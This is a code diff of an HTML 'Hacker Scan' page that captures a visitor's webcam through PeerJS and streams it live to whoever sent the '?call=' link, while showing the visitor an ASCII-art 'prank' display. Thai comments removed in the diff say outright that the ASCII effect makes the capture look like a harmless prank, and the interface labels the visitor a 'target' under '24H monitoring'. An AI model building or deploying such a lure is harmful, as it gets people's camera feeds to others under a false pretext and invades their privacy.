@@ -1,71 +1,67 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Hacker Scan - v.01</title>
+    <title>Hacker Scan 4:3 - v.02</title>
     <style>
         body { background: black; color: #fff; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
-        #ascii-display { font-size: 10px; line-height: 9px; white-space: pre; letter-spacing: 1px; color: #fff; font-weight: bold; }
-        .ui { position: absolute; bottom: 20px; color: #444; font-size: 12px; }
-        #status { color: #ff0000; margin-bottom: 10px; }
+        #ascii-display { font-size: 14px; line-height: 11px; white-space: pre; letter-spacing: 1px; color: #fff; font-weight: bold; }
+        .ui { position: absolute; bottom: 20px; color: #444; font-size: 12px; letter-spacing: 2px; }
+        #status { color: #00ff00; margin-bottom: 10px; font-weight: bold; }
+        /* ตกแต่งให้ดูเหมือนจอ 4:3 */
+        .monitor-frame { border: 2px solid #222; padding: 10px; background: #050505; box-shadow: 0 0 20px rgba(0,255,0,0.1); }
     </style>
 </head>
 <body>
 
-    <div id="status">WAITING FOR TARGET...</div>
-    <pre id="ascii-display"></pre>
-    <div class="ui">ENCRYPTED STREAM - 24H GROUP MONITORING</div>
+    <div id="status">SCANNING FOR SIGNAL...</div>
+    <div class="monitor-frame">
+        <pre id="ascii-display"></pre>
+    </div>
+    <div class="ui">RATIO: 4:3 | ENCRYPTED STREAM | 24H MONITOR</div>
 
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     
     <script>
         const asciiDisplay = document.getElementById('ascii-display');
         const status = document.getElementById('status');
-        const CHAR_SIZE = 12;
+        const CHAR_SIZE = 16; // ปรับขนาดตัวอักษรให้ใหญ่ตามที่ Achi ชอบ
         const chars = "@#8&WMHB*pxoI;:. ";
         
-        // --- ส่วนของ PeerJS (ระบบส่งภาพ) ---
-        // ถ้าคุณเป็นคนดู (Host) ให้ใส่ ID ว่า 'master-hacker' 
-        // ถ้าเพื่อนเปิด ลิงก์จะทำการโทรหา 'master-hacker' อัตโนมัติ
         const peer = new Peer(); 
 
         peer.on('open', (id) => {
-            console.log('My ID is: ' + id);
-            // ถ้าอยากแกล้งเพื่อน ให้ส่งลิงก์ที่มีพารามิเตอร์ไป เช่น ?target=master-hacker
             const urlParams = new URLSearchParams(window.location.search);
             const targetId = urlParams.get('call');
-            
             if (targetId) {
-                startCam(targetId); // ถ้ามี ID เป้าหมาย ให้เริ่มส่งกล้องทันที
+                startCam(targetId);
             } else {
-                status.innerText = "YOUR ID: " + id + " (ส่ง ID นี้ให้เพื่อน หรือเติม ?call=[ID] ในลิงก์)";
+                status.innerText = "YOUR ID: " + id;
+                console.log("Send this link: " + window.location.href + "?call=" + id);
             }
         });
 
         async function startCam(targetId) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                status.innerText = "TARGET IDENTIFIED - STREAMING...";
-                
-                // ส่งวิดีโอไปให้เครื่อง Master
+                // ล็อกสัดส่วนกล้องเป็น 4:3 (640x480)
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: { exact: 640 }, height: { exact: 480 }, aspectRatio: 1.333 } 
+                });
+                status.innerText = "TARGET IDENTIFIED - 4:3 STREAM";
                 peer.call(targetId, stream);
-                
-                // แสดงผล ASCII บนจอเพื่อนด้วย จะได้ดูเนียนว่าเป็นการแกล้ง
                 renderAscii(stream);
             } catch (err) {
-                status.innerText = "ERROR: ACCESS DENIED";
+                status.innerText = "ERROR: CAM BUSY OR NOT FOUND";
             }
         }
 
-        // รับสาย (สำหรับเครื่องที่จะใช้ดูเพื่อน)
         peer.on('call', (call) => {
-            call.answer(); // รับสายอัตโนมัติ
+            call.answer();
             call.on('stream', (remoteStream) => {
-                renderAscii(remoteStream); // แสดงภาพเพื่อนที่ส่งมาเป็น ASCII
-                status.innerText = "RECEIVING LIVE FEED...";
+                renderAscii(remoteStream);
+                status.innerText = "RECEIVING LIVE FEED [4:3]";
             });
         });
 
-        // --- ส่วนของการแปลง ASCII (ยกมาจากที่เราทำกัน) ---
         function renderAscii(stream) {
             const video = document.createElement('video');
             video.srcObject = stream;
@@ -75,22 +71,34 @@
             const ctx = canvas.getContext('2d');
 
             video.onloadedmetadata = () => {
-                const w = Math.floor(video.videoWidth / CHAR_SIZE);
-                const h = Math.floor(video.videoHeight / CHAR_SIZE);
+                // บังคับสัดส่วนการคำนวณ ASCII ให้เป็น 4:3
+                const w = 60; // จำนวนตัวอักษรแนวนอน
+                const h = 45; // จำนวนตัวอักษรแนวตั้ง (60 / 1.333)
                 canvas.width = w; canvas.height = h;
 
                 function draw() {
+                    ctx.save();
+                    ctx.translate(w, 0);
+                    ctx.scale(-1, 1);
                     ctx.drawImage(video, 0, 0, w, h);
+                    ctx.restore();
+
                     const pixels = ctx.getImageData(0, 0, w, h).data;
                     let frame = "";
                     for (let y = 0; y < h; y++) {
                         for (let x = 0; x < w; x++) {
                             const i = (y * w + x) * 4;
-                            const brightness = (pixels[i] + pixels[i+1] + pixels[i+2]) / 3;
-                            const charIdx = Math.floor((brightness / 256) * chars.length);
-                            frame += chars[chars.length - 1 - charIdx];
+                            const brightness = (0.299*pixels[i] + 0.587*pixels[i+1] + 0.114*pixels[i+2]);
+                            
+                            // ระบบเงา: มืดเกินไปไม่ต้องโชว์ตัวอักษร (ตามที่ Achi สั่ง)
+                            if (brightness < 70) {
+                                frame += " ";
+                            } else {
+                                const charIdx = Math.floor((brightness / 256) * chars.length);
+                                frame += chars[chars.length - 1 - charIdx];
+                            }
                         }
-                        frame += "\\n";
+                        frame += "\n";
                     }
                     asciiDisplay.innerText = frame;
                     requestAnimationFrame(draw);
